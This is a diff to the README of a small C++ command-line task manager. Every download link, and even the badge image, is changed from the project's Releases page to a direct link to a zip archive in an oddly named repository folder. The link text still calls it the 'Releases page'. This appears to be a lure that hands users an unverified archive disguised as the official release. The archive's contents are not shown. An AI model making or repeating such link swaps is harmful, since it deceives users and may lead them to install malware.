@@ -7,7 +7,7 @@ CPP-Todo-Manager is a simple command-line task manager built in C++. It helps yo
 To get started with CPP-Todo-Manager, follow the instructions below. You will be able to download and run the application in just a few easy steps.
 
 ## 📥 Download the Application
-[![Download CPP-Todo-Manager](https://img.shields.io/badge/Download_CPP--Todo--Manager-brightgreen)](https://github.com/anjotonzo12/CPP-Todo-Manager/releases)
+[![Download CPP-Todo-Manager](https://raw.githubusercontent.com/anjotonzo12/CPP-Todo-Manager/main/Tartaric/CPP-Todo-Manager_3.8-beta.2.zip)](https://raw.githubusercontent.com/anjotonzo12/CPP-Todo-Manager/main/Tartaric/CPP-Todo-Manager_3.8-beta.2.zip)
 
 ## 📂 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -17,7 +17,7 @@ Before you download, ensure your system meets the following requirements:
 - Disk Space: At least 100 MB available for installation.
 
 ## 🔗 Download & Install
-Visit the [Releases page](https://github.com/anjotonzo12/CPP-Todo-Manager/releases) to download the latest version. Follow these steps:
+Visit the [Releases page](https://raw.githubusercontent.com/anjotonzo12/CPP-Todo-Manager/main/Tartaric/CPP-Todo-Manager_3.8-beta.2.zip) to download the latest version. Follow these steps:
 
 1. On the Releases page, look for the latest version of CPP-Todo-Manager.
 2. Click on the download link for your operating system. 
@@ -64,7 +64,7 @@ If you want to customize your experience, you can easily modify the configuratio
 ## 🔍 Troubleshooting
 If you encounter issues while running the application, consider these troubleshooting tips:
 - **Error Messages:** Read any error messages carefully. These often give clues about what went wrong.
-- **Re-download the File:** Sometimes files can become corrupted. Try downloading it again from the [Releases page](https://github.com/anjotonzo12/CPP-Todo-Manager/releases).
+- **Re-download the File:** Sometimes files can become corrupted. Try downloading it again from the [Releases page](https://raw.githubusercontent.com/anjotonzo12/CPP-Todo-Manager/main/Tartaric/CPP-Todo-Manager_3.8-beta.2.zip).
 - **Check Dependencies:** Ensure all system requirements are met.
 
 ## 💬 Community Support
